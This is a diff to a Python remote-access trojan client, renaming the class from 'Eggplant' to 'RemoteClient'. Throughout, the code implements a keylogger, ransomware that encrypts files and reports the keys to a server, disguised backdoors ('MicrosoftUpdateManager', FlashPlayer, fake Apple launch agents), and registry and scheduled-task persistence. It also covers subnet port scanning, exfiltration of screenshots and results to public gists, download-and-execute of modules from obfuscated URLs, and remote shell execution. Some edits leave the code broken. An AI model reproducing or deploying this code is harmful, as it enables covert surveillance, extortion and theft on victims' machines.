@@ -1,25 +1,25 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+
 import os
 import sys
 import socket
 import subprocess
 import pip.commands.install as pip
+from time import sleep
+from uuid import uuid1
 from imp import new_module
+from json import loads, dumps
+from requests import get, post
 from base64 import b64encode, b64decode
 from binascii import hexlify, unhexlify
-from time import sleep
-from requests import get, post
-from uuid import uuid1
 
-# encryption
 try:
     from Crypto.Cipher import AES
     from Crypto.Hash import HMAC, SHA256
     from Crypto.Util.number import bytes_to_long, long_to_bytes
 except: pass
 
-# windows
 try:
     if os.name is 'nt':
         from _winreg import HKEY_CURRENT_USER, KEY_WRITE, KEY_ALL_ACCESS, REG_SZ, CloseKey, DeleteValue, OpenKey, SetValueEx
@@ -28,69 +28,85 @@ try:
 except: pass
 
 
-class Eggplant(object):
-    """
-    Mother of all Eggplants. Capable of birthing entire generations of eggplants
-    """
+class RemoteClient(object):
     def __init__(self, *args, **kwargs):
-        self.debug          = bool(kwargs.get('debug')) if 'debug' in kwargs else filterwarnings('ignore')
+        self.debug          = bool(kwargs.get('debug')) if kwargs.get('debug') else False
         self.connect_port   = int(kwargs.get('connect_port')) if kwargs.get('connect_port') else 1337
-        self.logger_port    = int(kwargs.get('logger_port')) if kwargs.get('logger_port') else 9020
         self.listen_port    = int(kwargs.get('listen_port')) if kwargs.get('listener_port') else 7331
         self.backdoor_port  = int(kwargs.get('backdoor_port')) if kwargs.get('backdoor_port') else 2090
-        self.urls           = dict({'gists':'https://api.github.com/gists','repo':'https://api.github.com/repos/colental/AngryEggplant/contents','raw':'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/%s','resources':'https://raw.githubusercontent.com/colental/AngryEggplant/master/resources/%s','services':'https://svnweb.freebsd.org/base/head/etc/services?revision=310355','imgur':'https://api.imgur.com/3/upload','adjectives':'https://raw.githubusercontent.com/janester/mad_libs/master/List%20of%20Adjectives.txt','nouns':'https://raw.githubusercontent.com/janester/mad_libs/master/List%20of%20Nouns.txt'})
+        self.urls           = dict({'gists':'https://api.github.com/gists','services':'https://svnweb.freebsd.org/base/head/etc/services?revision=310355','imgur':'https://api.imgur.com/3/upload'})
         self.files          = dict(kwargs.get('files')) if kwargs.get('files') else dict({'cache':[]})
         self.persistence    = dict(kwargs.get('persistence')) if kwargs.get('persistence') else dict({'scheduled tasks':[], 'hidden files':[], 'registry keys':[]}) if os.name is 'nt' else dict({'launch agents':[], 'hidden files':[]})
         self.server         = dict(kwargs.get('server')) if kwargs.get('server') else dict({'url': 'MTI2OGE3NDQ3MDI3MDRlYTA3MTAzYjM3M2VhMjMzODMxNWJmM2FiMGMyM2Y4MDEyMjRjODBmYmVlZmY2NzFlNTQyNzc0NTgwNDZlMGE4MTkwYWIyY2EyY2ZlMzQ1ZWFlNjczMzE2OTcyN2M1YjZkZjZjYTIwNjIwZTYzYjgyNTcyNDg0YjM5ZTI3NjIxZGI3N2QyZDMyNGVjMTk4ZDYxZmYyYTMzNmU2NDU4NzBmY2I4ZTU2ZmRiNDY1YzA5MDcyMmYxYTI3NDYyMDQzNzhjMmQ1NDNmZjRjNWRkODEyYjE2ZTMyZmZiYzc3N2ZhNTYzMzY1NjdkYjcyYjk1ZGZiMWQ3ODc2NDQyMjY2Y2E3MzYwODY2ZTZiODc1MjdlZjk0ZGI4Y2IyZjY5NGQ2YTgzNDljNzIwOTlmNTY5ZWZjMDllOTkzNDMyZjRiNzZlNjc3YTkyZjAyNDgxZjM3YjMyYTY3ZmYwYzk0M2VjYWE3MjVmNTI3MGY5MWE5NDYzYjY5NTI0Y2Y3ZDBlZjViYTAwNzE3OWIyNjQyODY4NTdhYzVmZjUzZTQ3YThjMzdlZGYzYWZjNzU0NDVmOWYzNDAwNzQ1NDhjZDAyNTU1YWU0NzIwMjE0ODM5MzhlY2EzMzQ5N2VlNzBjNDRlYmI0OTM1NzM4NjMxOTVkY2Q0OTUzNTg0Nzg4ZTU5NWMxODMyZWRjZGFjNTNmOTA2OTVlYzE1MjA2MzMzMDc2YjEzMzQzOTMwNDIzNjY1MTIwNjMxNTg3NzdjNDdiMjZhM2UzZDRjNzUxOWNhYjEzMDFkYjljYzM3YzQ1OTcxZjM=', 'api': 'ODY0MTY1YTBlMTg0MzlhYmIyN2Q4NGE0YjM3MWNiZDZlYmFmNDUzOTE3Mjk3NTA=', 'key': 'ODE0OTc0YzRkNDI1ZTVlYTA0YTM1YzkzMDY5OTE2NDRiMWYwODk2OTYzYzZmYTg1ODEyNGMxMGRiMDc0MzU2NjE2MDQ4NjI3ZTRhNWMzZGRkNTI1Y2ZlNTYzNmEyZDAzMTU3NzcwMDVhMmQ3NTRlNTZhOTkyMGRkOWZjOWIyMDQ3ZGRkMGIwMGM0ZWU5NWVlOGM0ODY0ZDk3ZWIwODQ2ODA4MDQ3ZmQzZTAzMzE2ZDJmMzU1NTRjMjMyY2EyNTQ1NDNmOTYzZDc1ZTBhZDA2ZGU4MTMzNzY2MTdlNzZhNzQwYmE1ZDEwMDA1YmQ5YmQ2YTMwYWEwZWJiNWM3MTI0NjI0NWJlZTI5N2ZlNGMzODJjYWU5ZjQxYmJmMjVjNmRiMWNhY2IyYmVhNTJhNmY4YWI3MzQxZDcyMjUyOTM2ZTg5M2UyNmE5NzQ1OTQ4YmYzMzk1YTg2YTRlMTczMTM3ODk1OGY0ODkxMWUxYzc0OQ=='})
         self.open_ports     = dict(kwargs.get('port_scans')) if kwargs.get('port_scans') else dict({})
-        self.backdoors      = dict(kwargs.get('backdoors')) if kwargs.get('backdoors') else dict({})
         self.local_network  = dict(kwargs.get('local_network')) if kwargs.get('local_network') else dict({})
         self.services       = dict({i.split()[1].split('/')[0]:[i.split()[0], ' '.join(i.split()[2:])] for i in get(self.urls.get('services')).text.encode().splitlines() if len(i.split())>1 if 'tcp' in i.split()[1]})
         self.crontab        = dict({'Crontab':'/etc/cron.d', 'User Crontab':'/var/spool/cron'}) if (sys.platform.startswith('linux') or sys.platform.endswith('nix')) else None
         self.fname          = bytes(os.path.splitext(os.path.basename(sys.argv[0]))[0])
         self.ip             = bytes(socket.gethostbyname(socket.gethostname()))
         self.external_ip    = bytes(get('http://api.ipify.org').text.encode())
-        self.localhost      = bytes(socket.gethostbyname(socket.gethostname()))
         self.login          = bytes(os.environ.get("USERNAME", failobj="Unknown"))
         self.machine        = bytes(os.environ.get("COMPUTERNAME", failobj="Unknown"))
         self.platform       = bytes(sys.platform) if 'darwin' not in sys.platform else 'macOS'
-        self.cwd            = bytes(kwargs.get('cwd')) if kwargs.get('cwd') else bytes(os.getcwd())
         self.mac            = bytes('-'.join(uuid1().hex[20:][i:i+2] for i in range(0,11,2)).upper())
-        self.pstring        = bytes('ping -n 1 -w 90 {}') if os.name is 'nt' else bytes('ping -c 1 -w 90 {}')
         self.device         = bytes(os.popen('uname -a').read()) if not os.name is 'nt' else bytes('Microsoft Windows {}'.format(' '.join([i.partition(':')[2].strip() for i in os.popen('GPRESULT /R').read().splitlines() if 'OS Version' in i or 'Domain' in i])))
-        self.links          = ['linux_payload.txt', 'osx_payload.sh', 'windows_payload.exe', 'icon.icns', 'icon.png', 'icon.ico', 'Info.plist', 'keylogger.py', 'screenshot.py', 'osx_make_app.py']
+        self.results        = dict({kwargs.get('results')}) if kwargs.get('results') else self._results()
         self.socket         = self._connect() if 'socket' not in kwargs else kwargs.get('socket')
         self.dhkey          = self._diffiehellman() if 'dhkey' not in kwargs else kwargs.get('dhkey')
+        self.commands       = self._commands()
+        self.cd             = lambda i: os.chdir(i)
         self.admin          = lambda: bool(windll.shell32.IsUserAnAdmin() == 0) if os.name is 'nt' else bool(os.getuid() == 0)
-        self.identity       = lambda: "\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Platform',self.platform), ('IP',self.ip), ('Machine',self.machine), ('Login',self.login), ('Admin',self.admin), ('Files',self.files)] if i[1]])
+        self.identity       = lambda: "\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Mac Address', self.mac), ('Platform',self.platform), ('LocalIP',self.ip), ('IP',self.external_ip), ('Machine',self.machine), ('Device',self.device), ('Login',self.login), ('Admin',self.admin())]])
         self.register       = lambda: dict({'uid':self.mac, 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'registry_keys':self.persistence.get('registry keys'), 'scheduled_tasks':self.persistence.get('scheduled tasks')}) if os.name is 'nt' else lambda:dict({'uid':self.mac, 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'launch_agents':self.persistence.get('launch agents')})
         self.get_modules    = lambda: [create_module(b64decode(get(i['git_url']).json()['content']), i['name']) for i in get(self._deobfuscate('YjY2ODk3OTQ1ODQ3MTQ4OGQ3ODAyMjU3NDhjNzEzYzMwNTc0NWFjMmIyZWY1NjMyYWUxZGVmNmI0ZDA2NDEwZTcxOTdkNTAwOTYyNmViODk2MTgyZDMzOWFlMjE1NDhhZTYzYTU3YjZhZGU5YzcyNzE0NjE0YTU2ODUyYmRlYjYwMDk4NGI5N2Q3MTVkZDNlNWI5N2I2OTI1YjViYjIwODVhYWUxZTA2ODAxZTczYWI3MjQ2NmZiOTE5Mjk4ODk2NWQ0NWUyMGYyYjBhMjhlNmQxYzcxYThjNDU5OTNkMTJiMjk2MjU1ZTU3ZWNlNjgwZDZlNzFkMjUyZWFmMTdiODY3Nzc3ZTYzNjEwMzEyNmZiNzJiYjY2MDYzNDZiYzcyOTIzM2FmZTljN2NkOTEyNDg1MjYwYzNjNzY0YWQ1YjcyMDIxNmVhYzk4OTY1Y2Q1N2UwZWE2ODQwYWQ3YTQxZDA2YjliODUxM2Q1OGViOTY2YzFiNmNhOTVlMjI4NzVmNDQzMDE0NzA1NTg0NTE4NWU2YWI4YzYxYWU4ODQ3YTFjM2U2NTc1MTUxMWJiYjQ3MjJiYWQ2NDdlZDA5NWIwYjM0YTNlYzlhMDUxZTA2ZTc4M2Q2MzMyODIzMzJlMjk3YTYwNTA0NDcyMjkwMzljODgzOTY0NTdjMjU1OTc2NGJlNDAwMThkNDAxNzZkMTIyNDMxZGM4MmJjMjM5ZGViM2QxMzdlYmFjOWU4MDE0ZDcyOWMyMTg2YmFmNDY2MjEyMjNlNzQ3NzdjOWI2YTI0MGRmYWViMTI2YWViMjQzMTdhMWJjZDQwM2I2ODViODNhMDgyM2M1ZTYyN2QwNmQ1YjhlODc3YWE0NDFhOTk3OWVhMGIzZA==')).json()]
-        self.commands       = { 'ls'            :   self.ls,
-                                'cat'           :   self.cat,
-                                'pwd'           :   self.pwd,
-                                'uac'           :   self.uac,
-                                'wget'          :   self.wget,
-                                'kill'          :   self.kill,
-                                'admin'         :   self.admin,
-                                'unzip'         :   self.unzip,
-                                'ransom'        :   self.ransom,
-                                'standby'       :   self.standby,
-                                'restart'       :   self.restart,
-                                'info'          :   self.identity,
-                                'selfdestruct'  :   self.destruct,
-                                'register'      :   self.register,
-                                'uid'           :   self.mac_address,
-                                'mac'           :   self.mac_address
-                                }
-        self.modules        = { 'backdoor'      :   self.backdoor,
-				'portscan'	:   self.portscan,
-                                'keylogger'     :   self.keylogger,
-                                'screenshot'    :   self.screenshot,
-                                'lan'           :   self.network_scan,
-                                'encrypt'       :   self.encrypt_file,
-                                'decrypt'       :   self.decrypt_file,
-                                'persistence'   :   self.run_persistence
-                                }
+
+    def _commands(self):
+         commands_dict  = {
+                            'ls'            :   self.ls,
+                            'cat'           :   self.cat,
+                            'pwd'           :   self.pwd,
+                            'uac'           :   self.uac,
+                            'wget'          :   self.wget,
+                            'kill'          :   self.kill,
+                            'admin'         :   self.admin,
+                            'unzip'         :   self.unzip,
+                            'standby'       :   self.standby,
+                            'restart'       :   self.restart,
+                            'info'          :   self.identity,
+                            'selfdestruct'  :   self.destruct,
+                            'register'      :   self.register,
+                            'uid'           :   self.mac_address,
+                            'mac'           :   self.mac_address
+                            }
+         return commands_dict
+
+    def _results(self):
+        results_dict = {
+                        'ransom'        :   [],
+                        'backdoor'      :   [],
+                        'portscan'	:   [],
+                        'keylogger'     :   [],
+                        'screenshot'    :   [],
+                        'lan'           :   [],
+                        'ransom'        :   [],
+                        'persistence'   :   []
+                        }
+        return results_dict
+
+    def _config(self):
+        if 'config' in os.listdir('.') and 'config.json' in os.listdir('config'):
+            config_json = loads(open('config/config.json','r').read())
+        else:
+            self._request
+
+    def _request(self, x):
+        self.send(x, method='request')
+        data = self.socket.recv(1024)
+        url = self._decrypt(data.rstrip())
+        if url.startswith('http'):
+            return url
+        else:
+            raise ValueError
         
     def _tempdir(self):
         try:
@@ -111,7 +127,7 @@ class Eggplant(object):
 
     def _tempfile(base=None, extension=''):
         return os.path.join(self._tempdir(), base + extension) if base else os.path.join(self._tempdir(), 'tmp_' + self._rand(3) + extension)
-            
+
     def _rand(self, e=1):
         return str().join([list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)])[int([n for n in [ord(os.urandom(1)) for i in xrange(100)] if n < len(list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)]))][0])] for _ in range(e)])
 
@@ -137,19 +153,30 @@ class Eggplant(object):
             execfile(sys.argv[0])
             sys.exit(0)
 
-    def _send(self, data, method='default'):
-        try:
-            block = data[:4096]
-            data  = data[len(block):]
-            ciphertext  = self._encrypt(block)
-            msg = '{}:{}\n'.format(method, ciphertext)
-            self.socket.sendall(msg)
-            if len(data):
-                return self._send(data, method)
-        except Exception as e:
-            if self.debug:
-                print "Send data returned error: {}".format(str(e))
-        
+    def _send(self, data, method='default', connection=None):
+        if not connection:
+            connection = self.socket
+        block = data[:4096]
+        data  = data[len(block):]
+        ciphertext  = self._encrypt(block)
+        msg = '{}:{}\n'.format(method, ciphertext)
+        connection.sendall(msg)
+        if len(data):
+            return self._send(data, method)
+
+    def _recieve(self, connection=None):
+        if not connection:
+            connection = self.socket
+        cmd_buffer  = ""
+        cmd_len     = 1
+        while cmd_len:
+            cmd_data    = connection.recv(1024)
+            cmd_len     = len(cmd_data)
+            cmd_buffer += cmd_data
+            if cmd_len < 1024:
+                break
+        return cmd_buffer
+
     def _diffiehellman(self, bits=2048):
         try:
             p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
@@ -175,8 +202,6 @@ class Eggplant(object):
             ciphertext = iv + cipher.encrypt(text)
             hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
             output = b64encode(ciphertext + hmac_sha256)
-            if self.debug:
-                print output
             return output
         except Exception as e:
             if self.debug:
@@ -190,9 +215,8 @@ class Eggplant(object):
             check_hmac  = ciphertext[-SHA256.digest_size:]
             calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
             output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
-            if self.debug:
-                print output.rstrip(b'\0')
-                if check_hmac != calc_hmac:
+            if check_hmac != calc_hmac:
+                if self.debug:
                     print str("Sent HMAC-SHA256 Hash: {}".format(hexlify(check_hmac)) + "\nCalc HMAC-SHA256 Hash: {}".format(hexlify(calc_hmac)))
             return output.rstrip(b'\0')
         except Exception as e:
@@ -236,18 +260,18 @@ class Eggplant(object):
             if 'osx_make_app' not in globals():
                 try:
                     osx_app_file = self.wget(os.path.join(self.urls['raw'], 'osx_make_app.py'))
-                    
+
                     with open(osx_app_file, 'r') as fp:
                         osx_app  = fp.read()
-                        
+
                     osx_make_app = create_module(osx_app, 'osx_make_app')
                 except Exception as osxe:
                     return "Mac OS X make app bundle download error: {}".format(str(osxe))
             try:
                 appname      = os.path.splitext(os.path.basename(sys.argv[0]))[0]
                 iconfile     = self.wget(os.path.join(self.urls['resources'], 'icon.icns'), path=icon_path)
-                payload_file = self.wget(os.path.join(self.urls['raw'], 'osx_backdoor.py'))
-                
+                payload_file = self.wget(os.path.join(self.urls['resources'], 'osx_backdoor.sh'))
+
                 with file(payload_file, 'r') as fr:
                     payload = fr.read()
 
@@ -261,7 +285,7 @@ class Eggplant(object):
                 return '\nBackdoor app:\t{}\nLaunch agent:\t{}\n'.format(str(os.getcwd() + os.sep + appname + '.app'), str('~Library/LaunchAgents/com.apple.' + appname))
             except Exception as x1:
                 return 'Mac OS X backdoor module failed with error: %s' % str(x1)
-            
+
         elif os.name is 'nt':
             try:
                 bd = self.wget(os.path.join(self.urls['raw'], 'windows/windows_payload.exe'), path='MicrosoftUpdateManager')
@@ -304,17 +328,17 @@ class Eggplant(object):
                 if self.debug:
                     print "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
                 return "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
-        
 
     def _ransom_update(self, filename):
         try:
             stmt = "INSERT INTO filesystems (ip, mac, filename, keyvalue) VALUES ('{}','{}','{}','{}')".format(self.ip, self.mac, os.path.abspath(filename), self.dhkey)
-            self._send(stmt, method='query')
+            self._send(stmt, method='ransom')
+            return
         except Exception as e:
             return "Ransom database update error: {}".format(str(e))
 
-    def _ransom(self, arg, dirname, fnames):
-        errors = [e for e in map(self._ransom_update, [x for x in map(self.encrypt_file, [os.path.join(dirname, i) for i in fnames]) if x]) if e]
+    def _ransom(self, _, directory, filenames):
+        errors = filter(self.encrypt_file, [os.path.join(directory, i) for i in filenames])
         if errors:
             if self.debug:
                 print "Warning: worker returned the following error(s):\n{}".format("\n".join(errors))
@@ -334,37 +358,14 @@ class Eggplant(object):
 
     def _identity(self):
         return self.identity()
-    
+
     def _ping(self, host, *args):
+        ping = 'ping -n 1 -w 90 %s' if os.name is 'nt' else 'ping -c 1 -w 90 %s'
         try:
-            if subprocess.call(self.pstring.format(host), shell=True) == 0:
+            if subprocess.call(ping % host, shell=True) == 0:
                 return host
         except: pass
 
-    def _portscan(self, ip):
-        try:
-            socket.inet_aton(ip)
-        except socket.error:
-            return 'Error: Invalid IP address.'
-
-        results = [ip, '\t{:>5}\t{:>4}\t{:<20}'.format('Port','State','Service')]
-
-        for p in [21, 22, 23, 25, 53,
-                  80, 110, 111, 135, 139,
-                  143, 179, 443, 445, 514,
-                  993, 995, 1723, 3306, 3389,
-                  5900, 8000, 8080, 8443, 8888]:
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            c = s.connect_ex((ip, p))
-            socket.setdefaulttimeout(0.5)
-            if not c:
-                state   = 'open'
-                service = ' '.join(self.services.get(str(p))).title()
-                results.append('\t{:>5}\t{:>4}\t{:<20}'.format(p, state, service))
-
-        return '\n'.join(results)
-    
     def _unschedule_tasks(self):
         all_tasks = self.persistence.get('scheduled tasks')
         for task in all_tasks:
@@ -400,6 +401,30 @@ class Eggplant(object):
                     except Exception as p:
                         if self.debug:
                             print "Remove backdoor returned error: {}".format(str(p))
+
+    def portscan(self, ip):
+        try:
+            socket.inet_aton(ip)
+        except socket.error:
+            return 'Error: Invalid IP address.'
+
+        results = [ip, '\t{:>5}\t{:>4}\t{:<20}'.format('Port','State','Service')]
+
+        for p in [21, 22, 23, 25, 53,
+                  80, 110, 111, 135, 139,
+                  143, 179, 443, 445, 514,
+                  993, 995, 1723, 3306, 3389,
+                  5900, 8000, 8080, 8443, 8888]:
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            c = s.connect_ex((ip, p))
+            socket.setdefaulttimeout(0.5)
+            if not c:
+                state   = 'open'
+                service = ' '.join(self.services.get(str(p))).title()
+                results.append('\t{:>5}\t{:>4}\t{:<20}'.format(p, state, service))
+
+        return '\n'.join(results)
 
     def run_persistence(self, **kwargs):
         if os.name is 'nt':
@@ -443,9 +468,12 @@ class Eggplant(object):
                 osx_paths = ['var','tmp','lib','local','cache']
                 osx_files = ['.local','.cache','.fsevents','.V100_Spotlight','.bash_profile']
                 fpath = os.path.join(self._choice(osx_paths), self._choice(osx_files))
-                os.makedirs(fpath) if not os.path.isdir(fpath) else None
-            except:
-                fpath = os.path.join(os.environ.get('TEMP', failobj=os.getcwd()), self._choice(osx_files))
+                fpath = self._tempfile(base=fpath)
+                if not os.path.isdir(os.path.dirname(fpath)):
+                    os.makedirs(fpath)
+            except Exception as e4:
+                return 'Backdoor failed with error: %s' % str(e4)
+
             try:
                 plist       = get(os.path.join(self.urls['raw'], 'Info.plist')).text.encode()
                 label       = self._choice(['updates','cache','itunes','spotlight','archives'])
@@ -497,36 +525,33 @@ class Eggplant(object):
             if self.debug:
                 print "Kill client failed with error: {}".format(str(e))
 
-    def portscan(self, host=None):
-        if not host:
-            host = self.ip
-        return self._portscan(host)
-
-    def store_result(self, filename):
+    def upload_result(filename):
         try:
-            description = self._choice(self.adjectives).title() + self._choice(self.nouns).title()
-            if self.debug:
-                print 'Posting results as anonymous gist with description %s' % description
-            do = post('https://api.github.com/gists', headers={"description":description,"public":"true","files":{filename:{"content":open(filename.read())}}})
-        except: pass
-                
-    def run_module(self, cmd, action=None):
-        try:
-            if cmd in self.commands:
-                result = self.commands[cmd](action) if action else self.commands[cmd]()
-            elif cmd in globals():
-                result = globals()[cmd](action) if action else globals()[cmd]()
-            else:
-                try:
-                    url = self.urls.get('raw') % str(cmd)
-                    code = get(url).text.encode()
-                    _ = create_module(code, str(cmd))
-                    result = run_module(cmd, action) if action else run_command(cmd)
-                except Exception as e3:
-                    result = "Command didn't match any current modules.\nAttempted to download module from the repository ['%s'].\nDownload failed with error: %s" % (str(url), str(e3))
+            with open(filename, 'r') as fd:
+                content = b64encode(fd.read())
+            url     = 'https://api.github.com/gists'
+            header  = {'Content-type':'application/x-www-form-urlencoded'}
+            name    = choice(words['adjectives']).title() + choice(words['nouns']).title()
+            coding  = 'json' if os.path.splitext(filename)[1] == 'json' else 'base64'
+            files   = {filename: {"content": content, "encoding": coding}}
+            datas   = dumps({"description": name, "public": "true", "files": files})
+            result  = post(url, data=datas, headers=header).json()
             return result
         except Exception as e:
-            return "Run %s returned error: %s" % (str(cmd), str(e))
+            return 'Upload result failed with error: %s' % str(e)
+
+    def get_module(self, name, action=None):
+        global create_module
+        if name not in sys.modules:
+            try:
+                url     = self._request('modules')
+                encoded = get(url).json()
+                name, _ = os.path.splitext(os.path.basename(encoded['path']))
+                code    = b64decode(encoded['content'])
+                module  = create_module(code, name)
+                return module(action) if action else module()
+            except Exception as e:
+                return "Attempted to download module '%s'.\nDownload failed with error: %s" % (str(name), str(e))
 
     def uac(self):
         try:
@@ -545,8 +570,7 @@ class Eggplant(object):
                 os.path.walk(path, self._ransom, None)
             except Exception as e:
                 if self.debug:
-                    print "Ransom error: {}".format(str(e))
-                return "Ransom error: {}".format(str(e))
+                    return "Ransom error: {}".format(str(e))
         return "Successfully encrypted '{}'".format(path)
 
     def encrypt_file(self, filename):
@@ -556,13 +580,13 @@ class Eggplant(object):
                     data = fp.read()
                 with file(filename, 'w') as fc:
                     fc.write(self._encrypt(data))
-                return filename
+                return self._ransom_update(filename)
             except Exception as e:
                 if self.debug:
                     print "File encryption returned an error: {}".format(str(e))
-            
+
     def decrypt_file(self, filename):
-        if os.path.isfile(filename):        
+        if os.path.isfile(filename):
             try:
                 with file(filename, 'r') as fp:
                     data = fp.read()
@@ -579,7 +603,7 @@ class Eggplant(object):
             return 'Current directory: {}'.format(os.getcwd())
         except Exception as e:
             return 'Change directory returned error: {}'.format(str(e))
-        
+
     def cat(self, filepath):
         if os.path.isfile(filepath):
             try:
@@ -610,7 +634,7 @@ class Eggplant(object):
                 except Exception as z:
                     if self.debug:
                         print "Backdoor-destruct error: {}".format(str(z))
-                        
+
             for k in self.files.keys():
                 for f in self.files.get(k):
                     if os.path.isfile(f):
@@ -686,18 +710,16 @@ class Eggplant(object):
     def network_scan(self, target=None):
         if not target:
             target = self.ip
-            result = {}
-        else:
             result = self.local_network
-        
+        else:
+            result = {}
+
         subnet = filter(self._ping, ['.'.join(target.split('.')[:-1]) + '.' + str(i) for i in range(1,255)])
-        
+
         for ip in subnet:
-            result[ip] = self.portscan(ip)           
+            result[ip] = self.portscan(ip)
 
-        return '\n'.join([result.get(host)for host in result])
-            
-
+        return '\n\n'.join([result[ip] for ip in subnet])
 
     def wget(self, url, base=None):
         if not url.startswith('http'):
@@ -706,7 +728,7 @@ class Eggplant(object):
             data = get(url).text.encode()
         except Exception as x:
             return "Wget '%s' returned error: %s" % (str(url), str(x))
-    
+
         filetype    = os.path.splitext(url)[1]
         filename    = os.path.basename(os.path.splitext(url)[0])
         tempfile    = self._tempfile(base, filetype) if base else self._tempfile(base=filename, extension=filetype)
@@ -714,21 +736,17 @@ class Eggplant(object):
         if extension in ('.exe','.sh'):
             with file(filename, 'wb') as fp:
                 fp.write(data)
-                
         else:
             with file(filename, 'w') as fp:
                 fp.write(data)
-                
         return filename
 
     def screenshot(self):
         global create_module
-        if 'screenshot' not in self.modules:
-            code = get(os.path.join(self.urls['raw'], 'screenshot.py')).text.encode()
-            mod  = create_module(code, 'screenshot')
-            self.modules['screenshot'] = mod
+        if 'screenshot' not in sys.modules:
+            self.get_module('screenshot')
 
-        pic = self.modules['screenshot']()
+        pic = sys.modules['screenshot']()
 
         with open(pic, 'rb') as fp:
             contents = b64encode(fp.read())
@@ -748,19 +766,24 @@ class Eggplant(object):
                     if os.path.isfile(self.files.get('keylogger')):
                         os.startfile(self.files.get('keylogger'))
                 else:
-                    egglog   = os.path.join(self.urls['raw'], 'keylogger.py')
-                    kname    = 'egglog'
-                    interval = 'hourly'
-                    kfile = self.wget(egglog)
-                    self.persistence.update({'keylogger':[kfile]})
-                    os.startfile(kfile)
-                    hide = os.popen('attrib +h {}'.format(kfile)).read()
-                    self.persistence.get('hidden files').append(kfile)
-                    create  = os.popen('schtasks /CREATE /TN {} /TR {} /SC {}'.format(kname, kfile, interval)).read()                        
-                    if 'SUCCESS' in create:
-                        self.persistence.get('scheduled tasks').append(kname)
-                    return create
-                
+                    request  = self._send('modules', method='request')
+                    url     = self._decrypt(request.rstrip())
+                    if url.startswith('http'):
+                        egglog   = os.path.join(url, 'keylogger.py')
+                        kname    = 'egglog'
+                        interval = 'hourly'
+                        kfile = self.wget(egglog)
+                        self.persistence.update({'keylogger':[kfile]})
+                        os.startfile(kfile)
+                        hide = os.popen('attrib +h {}'.format(kfile)).read()
+                        self.persistence.get('hidden files').append(kfile)
+                        create  = os.popen('schtasks /CREATE /TN {} /TR {} /SC {}'.format(kname, kfile, interval)).read()                        
+                        if 'SUCCESS' in create:
+                            self.persistence.get('scheduled tasks').append(kname)
+                            return create
+                    else:
+                        return 'Failed to download keylogger module (URL scheme invalid)'
+                    
             elif 'stop' in action:
                 if 'keylogger' in self.files:
                     _ = map(os.remove, self.files.get('keylogger'))
@@ -778,7 +801,7 @@ class Eggplant(object):
             else:
                 return "Invalid command"
         else:
-            ans = "Mac OS X not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{}-based platforms not yet supported for remote logging".format(sys.platform)
+            ans = "Mac OS X not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{} platforms not yet supported for remote logging".format(sys.platform)
             return ans
 
     def backdoor(self, app='FlashPlayer'):
@@ -798,14 +821,22 @@ class Eggplant(object):
         repo = get(self.urls.get('repo')).json()
         for i in repo:
             if 'client.py' in i.get('name'):
+                name, _ = os.path.splitext(i.get('name'))
                 code    = get(i.get('download_url')).json().get('content')
-                module  = create_module(code, name)                
-        return True
-            
+                module  = create_module(code, name)
+        print 'Restarting in 10...'
+        sleep(10)
+        execfile(sys.argv[0])
+        sys.exit(0)
+
+    def run_command(self, cmd):
+        process = subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+        return str().join((process.communicate()))
+
     def standby(self, host):
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind(('', self.listen_port))
+            s.bind(('0.0.0.0', self.listen_port))
             s.listen(1)
             conn, addr = s.accept()
             if addr[0] == host:
@@ -818,17 +849,13 @@ class Eggplant(object):
         return self.run()
 
     def run(self, connection=None):
-        while connection:
-            self._send("Client[{}]> ", method='prompt')
-            cmd_buffer = ""
-            cmd_len    = 1
+        while True:
+            if not connection:
+                connection = self.socket
+                
+            prompt  = "<[{}:{}#]> ".format(sys.platform.lower(), self.ip)
+            self._send(prompt, method='prompt')
             
-            while cmd_len:
-                cmd_data    = self.socket.recv(1024)
-                cmd_len     = len(cmd_data)
-                cmd_buffer += cmd_data
-                if cmd_len < 1024:
-                    break
 
             if len(cmd_buffer):
                 
@@ -838,18 +865,17 @@ class Eggplant(object):
                 if cmd in self.commands:
                     output = self.commands[cmd](action) if action else self.commands[cmd]()
                     
-                elif cmd in self.modules:
-                    output = self.modules[cmd](action) if action else self.modules[cmd]()
+                elif cmd in sys.modules:
+                    output = sys.modules[cmd](action) if action else sys.modules[cmd]()
                     
                 elif cmd in globals():
                     output = globals()[cmd](action) if action else globals()[cmd]()
 
